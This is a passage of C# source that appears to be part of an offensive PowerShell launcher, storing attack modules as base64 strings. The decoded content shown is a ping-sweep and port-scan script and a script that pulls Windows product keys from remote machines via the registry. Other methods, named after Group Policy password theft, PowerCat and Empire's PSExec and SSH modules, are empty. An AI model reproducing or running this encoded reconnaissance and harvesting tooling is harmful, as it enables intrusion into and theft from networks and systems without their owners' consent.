gICAgICAgICRSZXNvbHZlSG9zdCwKCiAgICAgICAgW3N3aXRjaF0KICAgICAgICAkU2NhblBvcnQsCgogICAgICAgIFtpbnRbXV0KICAgICAgICAkUG9ydHMgPSBAKDIxLDIyLDIzLDUzLDY5LDcxLDgwLDk4LDExMCwxMzksMTExLDM4OSw0NDMsNDQ1LDEwODAsMTQzMywyMDAxLDIwNDksMzAwMSwzMTI4LDUyMjIsNjY2Nyw2ODY4LDc3NzcsNzg3OCw4MDgwLDE1MjEsMzMwNiwzMzg5LDU4MDEsNTkwMCw1NTU1LDU5MDEpLAogICAgICAgIAogICAgICAgIFtpbnRdCiAgICAgICAgJFRpbWVPdXQgPSAxMDAKICAgICkgIAogICAgQmVnaW4gewogICAgJHBpbmcgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya2luZm9ybWF0aW9uLlBpbmcKICAgIH0KICAgIFByb2Nlc3MgewogICAgZm9yZWFjaCgkYSBpbiAoJFN0YXJ0QWRkcmVzcy5TcGxpdCgiLiIpWzBdLi4kRW5kQWRkcmVzcy5TcGxpdCgiLiIpWzBdKSkgewogICAgICAgIGZvcmVhY2goJGIgaW4gKCRTdGFydEFkZHJlc3MuU3BsaXQoIi4iKVsxXS4uJEVuZEFkZHJlc3MuU3BsaXQoIi4iKVsxXSkpIHsKICAgICAgICBmb3JlYWNoKCRjIGluICgkU3RhcnRBZGRyZXNzLlNwbGl0KCIuIilbMl0uLiRFbmRBZGRyZXNzLlNwbGl0KCIuIilbMl0pKSB7CiAgICAgICAgICAgIGZvcmVhY2goJGQgaW4gKCRTdGFydEFkZHJlc3MuU3BsaXQoIi4iKVszXS4uJEVuZEFkZHJlc3MuU3BsaXQoIi4iKVszXSkpIHsKICAgICAgICAgICAgd3JpdGUtcHJvZ3Jlc3MgLWFjdGl2aXR5IFBpbmdTd2VlcCAtc3RhdHVzICIkYS4kYi4kYy4kZCIgLXBlcmNlbnRjb21wbGV0ZSAoKCRkLygkRW5kQWRkcmVzcy5TcGxpdCgiLiIpWzNdKSkgKiAxMDApCiAgICAgICAgICAgICRwaW5nU3RhdHVzID0gJHBpbmcuU2VuZCgiJGEuJGIuJGMuJGQiLCRUaW1lT3V0KQogICAgICAgICAgICBpZigkcGluZ1N0YXR1cy5TdGF0dXMgLWVxICJTdWNjZXNzIikgewogICAgICAgICAgICAgICAgaWYoJFJlc29sdmVIb3N0KSB7CiAgICAgICAgICAgICAgICB3cml0ZS1wcm9ncmVzcyAtYWN0aXZpdHkgUmVzb2x2ZUhvc3QgLXN0YXR1cyAiJGEuJGIuJGMuJGQiIC1wZXJjZW50Y29tcGxldGUgKCgkZC8oJEVuZEFkZHJlc3MuU3BsaXQoIi4iKVszXSkpICogMTAwKSAtSWQgMQogICAgICAgICAgICAgICAgJGdldEhvc3RFbnRyeSA9IFtOZXQuRE5TXTo6QmVnaW5HZXRIb3N0RW50cnkoJHBpbmdTdGF0dXMuQWRkcmVzcywgJG51bGwsICRudWxsKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYoJFNjYW5Qb3J0KSB7CiAgICAgICAgICAgICAgICAkb3BlblBvcnRzID0gQCgpCiAgICAgICAgICAgICAgICBmb3IoJGkgPSAxOyAkaSAtbGUgJHBvcnRzLkNvdW50OyRpKyspIHsKICAgICAgICAgICAgICAgICAgICAkcG9ydCA9ICRQb3J0c1soJGktMSldCiAgICAgICAgICAgICAgICAgICAgd3JpdGUtcHJvZ3Jlc3MgLWFjdGl2aXR5IFBvcnRTY2FuIC1zdGF0dXMgIiRhLiRiLiRjLiRkIiAtcGVyY2VudGNvbXBsZXRlICgoJGkvKCRQb3J0cy5Db3VudCkpICogMTAwKSAtSWQgMgogICAgICAgICAgICAgICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UY3BDbGllbnQKICAgICAgICAgICAgICAgICAgICAkYmVnaW5Db25uZWN0ID0gJGNsaWVudC5CZWdpbkNvbm5lY3QoJHBpbmdTdGF0dXMuQWRkcmVzcywkcG9ydCwkbnVsbCwkbnVsbCkKICAgICAgICAgICAgICAgICAgICBpZigkY2xpZW50LkNvbm5lY3RlZCkgewogICAgICAgICAgICAgICAgICAgICRvcGVuUG9ydHMgKz0gJHBvcnQKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICMgV2FpdAogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaSAkVGltZU91dAogICAgICAgICAgICAgICAgICAgIGlmKCRjbGllbnQuQ29ubmVjdGVkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRvcGVuUG9ydHMgKz0gJHBvcnQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRjbGllbnQuQ2xvc2UoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYoJFJlc29sdmVIb3N0KSB7CgkJCQkJdHJ5IHsKICAgICAgICAgICAgICAgIAkJJGhvc3ROYW1lID0gKFtOZXQuRE5TXTo6RW5kR2V0SG9zdEVudHJ5KFtJQXN5bmNSZXN1bHRdJGdldEhvc3RFbnRyeSkpLkhvc3ROYW1lCgkJCQkJfQoJCQkJCWNhdGNoIHsKCQkJCQkJJGhvc3RuYW1lID0gJ05vIHN1Y2ggaG9zdCBpcyBrbm93bicKCQkJCQl9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAjIFJldHVybiBPYmplY3QKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7CiAgICAgICAgICAgICAgICBJUEFkZHJlc3MgPSAiJGEuJGIuJGMuJGQiOwogICAgICAgICAgICAgICAgSG9zdE5hbWUgPSAkaG9zdE5hbWU7CiAgICAgICAgICAgICAgICBQb3J0cyA9ICRvcGVuUG9ydHMKICAgICAgICAgICAgICAgIH0gfCBTZWxlY3QtT2JqZWN0IElQQWRkcmVzcywgSG9zdE5hbWUsIFBvcnRzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICB9CiAgICBFbmQgewogICAgfQp9Cgp9IC1OYW1lIFBvcnQtU2Nhbgo="));
        }

        public static string AutoGPPPassword()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string PowerCat()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string GetProductKey()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"TmV3LU1vZHVsZSAtU2NyaXB0QmxvY2sgew0KDQpmdW5jdGlvbiBHZXQtUHJvZHVjdEtleSB7DQo8IyAgIA0KICAgIC5TWU5PUFNJUyAgIA0KICAgICAgICBSZXRyaWV2ZXMgdGhlIHByb2R1Y3Qga2V5IGFuZCBPUyBpbmZvcm1hdGlvbiBmcm9tIGEgbG9jYWwgb3IgcmVtb3RlIHN5c3RlbS9zLg0KICAgICAgICAgDQogICAgLkRFU0NSSVBUSU9OICAgDQogICAgICAgIFJldHJpZXZlcyB0aGUgcHJvZHVjdCBrZXkgYW5kIE9TIGluZm9ybWF0aW9uIGZyb20gYSBsb2NhbCBvciByZW1vdGUgc3lzdGVtL3MuIFF1ZXJpZXMgb2YgNjRiaXQgT1MgZnJvbSBhIDMyYml0IE9TIHdpbGwgcmVzdWx0IGluIA0KICAgICAgICBpbmFjY3VyYXRlIGRhdGEgYmVpbmcgcmV0dXJuZWQgZm9yIHRoZSBQcm9kdWN0IEtleS4gWW91IG11c3QgcXVlcnkgYSA2NGJpdCBPUyBmcm9tIGEgc3lzdGVtIHJ1bm5pbmcgYSA2NGJpdCBPUy4NCiAgICAgICAgDQogICAgLlBBUkFNRVRFUiBDb21wdXRlcm5hbWUNCiAgICAgICAgTmFtZSBvZiB0aGUgbG9jYWwgb3IgcmVtb3RlIHN5c3RlbS9zLg0KICAgICAgICAgDQogICAgLk5PVEVTICAgDQogICAgICAgIEF1dGhvcjogQm9lIFByb3gNCiAgICAgICAgVmVyc2lvbjogMS4xICAgICAgIA0KICAgICAgICAgICAgLVVwZGF0ZSBvZiBmdW5jdGlvbiBmcm9tIGh0dHA6Ly9wb3dlcnNoZWxsLmNvbS9jcy9ibG9ncy90aXBzL2FyY2hpdmUvMjAxMi8wNC8zMC9nZXR0aW5nLXdpbmRvd3MtcHJvZHVjdC1rZXkuYXNweA0KICAgICAgICAgICAgLUFkZGVkIGNhcGFiaWxpdHkgdG8gcXVlcnkgbW9yZSB0aGFuIG9uZSBzeXN0ZW0NCiAgICAgICAgICAgIC1TdXBwb3J0cyByZW1vdGUgc3lzdGVtIHF1ZXJ5DQogICAgICAgICAgICAtU3VwcG9ydHMgcXVlcnlpbmcgNjRiaXQgT1Nlcw0KICAgICAgICAgICAgLVNob3dzIE9TIGRlc2NyaXB0aW9uIGFuZCBWZXJzaW9uIGluIG91dHB1dCBvYmplY3QNCiAgICAgICAgICAgIC1FcnJvciBIYW5kbGluZw0KICAgICANCiAgICAuRVhBTVBMRSANCiAgICAgR2V0LVByb2R1Y3RLZXkgLUNvbXB1dGVybmFtZSBTZXJ2ZXIxDQogICAgIA0KICAgIE9TRGVzY3JpcHRpb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJuYW1lIE9TVmVyc2lvbiBQcm9kdWN0S2V5ICAgICAgICAgICAgICAgICAgIA0KICAgIC0tLS0tLS0tLS0tLS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0tLS0tLS0tIC0tLS0tLS0tLSAtLS0tLS0tLS0tICAgICAgICAgICAgICAgICAgIA0KICAgIE1pY3Jvc29mdChSKSBXaW5kb3dzKFIpIFNlcnZlciAyMDAzLCBFbnRlcnByaXNlIEVkaXRpb24gU2VydmVyMSAgICAgICA1LjIuMzc5MCAgYmNkZmctaGprbG0tcHFydHQtdnd4eXktMTIzNDUgICAgIA0KICAgICAgICAgDQogICAgICAgIERlc2NyaXB0aW9uIA0KICAgICAgICAtLS0tLS0tLS0tLSANCiAgICAgICAgUmV0cmlldmVzIHRoZSBwcm9kdWN0IGtleSBpbmZvcm1hdGlvbiBmcm9tICdTZXJ2ZXIxJw0KIz4gICAgICAgICANCiAgICBbY21kbGV0YmluZGluZygpXQ0KICAgIFBhcmFtICgNCiAgICAgICAgW3BhcmFtZXRlcihWYWx1ZUZyb21QaXBlTGluZT0kVHJ1ZSxWYWx1ZUZyb21QaXBlTGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0NCiAgICAgICAgW0FsaWFzKCJDTiIsIl9fU2VydmVyIiwiSVBBZGRyZXNzIiwiU2VydmVyIildDQogICAgICAgIFtzdHJpbmdbXV0kQ29tcHV0ZXJuYW1lID0gJEVudjpDb21wdXRlcm5hbWUNCiAgICApDQogICAgQmVnaW4geyAgIA0KICAgICAgICAkbWFwPSJCQ0RGR0hKS01QUVJUVldYWTIzNDY3ODkiIA0KICAgIH0NCiAgICBQcm9jZXNzIHsNCiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlcm5hbWUpIHsNCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCJ7MH06IENoZWNraW5nIG5ldHdvcmsgYXZhaWxhYmlsaXR5IiAtZiAkQ29tcHV0ZXIpDQogICAgICAgICAgICBJZiAoVGVzdC1Db25uZWN0aW9uIC1Db21wdXRlck5hbWUgJENvbXB1dGVyIC1Db3VudCAxIC1RdWlldCkgew0KICAgICAgICAgICAgICAgIFRyeSB7DQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCJ7MH06IFJldHJpZXZpbmcgV01JIE9TIGluZm9ybWF0aW9uIiAtZiAkQ29tcHV0ZXIpDQogICAgICAgICAgICAgICAgICAgICRPUyA9IEdldC1XbWlPYmplY3QgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXIgV2luMzJfT3BlcmF0aW5nU3lzdGVtIC1FcnJvckFjdGlvbiBTdG9wICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIH0gQ2F0Y2ggew0KICAgICAgICAgICAgICAgICAgICAkT1MgPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSBAew0KICAgICAgICAgICAgICAgICAgICAgICAgQ2FwdGlvbiA9ICRfLkV4Y2VwdGlvbi5NZXNzYWdlDQogICAgICAgICAgICAgICAgICAgICAgICBWZXJzaW9uID0gJF8uRXhjZXB0aW9uLk1lc3NhZ2UNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBUcnkgew0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICgiezB9OiBBdHRlbXB0aW5nIHJlbW90ZSByZWdpc3RyeSBhY2Nlc3MiIC1mICRDb21wdXRlcikNCiAgICAgICAgICAgICAgICAgICAgJHJlbW90ZVJlZyA9IFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXldOjpPcGVuUmVtb3RlQmFzZUtleShbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5SGl2ZV06OkxvY2FsTWFjaGluZSwkQ29tcHV0ZXIpDQogICAgICAgICAgICAgICAgICAgIElmICgkT1MuT1NBcmNoaXRlY3R1cmUgLWVxICc2NC1iaXQnKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWUgPSAkcmVtb3RlUmVnLk9wZW5TdWJLZXkoIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uIikuR2V0VmFsdWUoJ0RpZ2l0YWxQcm9kdWN0SWQ0JylbMHgzNC4uMHg0Ml0NCiAgICAgICAgICAgICAgICAgICAgfSBFbHNlIHsgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICR2YWx1ZSA9ICRyZW1vdGVSZWcuT3BlblN1YktleSgiU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24iKS5HZXRWYWx1ZSgnRGlnaXRhbFByb2R1Y3RJZCcpWzB4MzQuLjB4NDJdDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJFByb2R1Y3RLZXkgPSAiIiAgDQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCJ7MH06IFRyYW5zbGF0aW5nIGRhdGEgaW50byBwcm9kdWN0IGtleSIgLWYgJENvbXB1dGVyKQ0KICAgICAgICAgICAgICAgICAgICBmb3IgKCRpID0gMjQ7ICRpIC1nZSAwOyAkaS0tKSB7IA0KICAgICAgICAgICAgICAgICAgICAgICRyID0gMCANCiAgICAgICAgICAgICAgICAgICAgICBmb3IgKCRqID0gMTQ7ICRqIC1nZSAwOyAkai0tKSB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgJHIgPSAoJHIgKiAyNTYpIC1ieG9yICR2YWx1ZVskal0gDQogICAgICAgICAgICAgICAgICAgICAgICAkdmFsdWVbJGpdID0gW21hdGhdOjpGbG9vcihbZG91YmxlXSgkci8yNCkpIA0KICAgICAgICAgICAgICAgICAgICAgICAgJHIgPSAkciAlIDI0IA0KICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgJFByb2R1Y3RLZXkgPSAkbWFwWyRyXSArICRQcm9kdWN0S2V5IA0KICAgICAgICAgICAgICAgICAgICAgIGlmICgoJGkgJSA1KSAtZXEgMCAtYW5kICRpIC1uZSAwKSB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgJFByb2R1Y3RLZXkgPSAiLSIgKyAkUHJvZHVjdEtleSANCiAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBDYXRjaCB7DQogICAgICAgICAgICAgICAgICAgICRQcm9kdWN0S2V5ID0gJF8uRXhjZXB0aW9uLk1lc3NhZ2UNCiAgICAgICAgICAgICAgICB9ICAgICAgICANCiAgICAgICAgICAgICAgICAkb2JqZWN0ID0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsNCiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJuYW1lID0gJENvbXB1dGVyDQogICAgICAgICAgICAgICAgICAgIFByb2R1Y3RLZXkgPSAkUHJvZHVjdEtleQ0KICAgICAgICAgICAgICAgICAgICBPU0Rlc2NyaXB0aW9uID0gJG9zLkNhcHRpb24NCiAgICAgICAgICAgICAgICAgICAgT1NWZXJzaW9uID0gJG9zLlZlcnNpb24NCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICRvYmplY3QucHN0eXBlbmFtZXMuaW5zZXJ0KDAsJ1Byb2R1Y3RLZXkuSW5mbycpDQogICAgICAgICAgICAgICAgJG9iamVjdA0KICAgICAgICAgICAgfSBFbHNlIHsNCiAgICAgICAgICAgICAgICAkb2JqZWN0ID0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsNCiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJuYW1lID0gJENvbXB1dGVyDQogICAgICAgICAgICAgICAgICAgIFByb2R1Y3RLZXkgPSAnVW5yZWFjaGFibGUnDQogICAgICAgICAgICAgICAgICAgIE9TRGVzY3JpcHRpb24gPSAnVW5yZWFjaGFibGUnDQogICAgICAgICAgICAgICAgICAgIE9TVmVyc2lvbiA9ICdVbnJlYWNoYWJsZScNCiAgICAgICAgICAgICAgICB9ICANCiAgICAgICAgICAgICAgICAkb2JqZWN0LnBzdHlwZW5hbWVzLmluc2VydCgwLCdQcm9kdWN0S2V5LkluZm8nKQ0KICAgICAgICAgICAgICAgICRvYmplY3QgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCn0gDQoNCn0gLU5hbWUgR2V0LVByb2R1Y3RLZXk="));
        }

        public static string Empire_InvokePSExec()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }

        public static string Empire_InvokeSshCommand()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
        }    
    }
}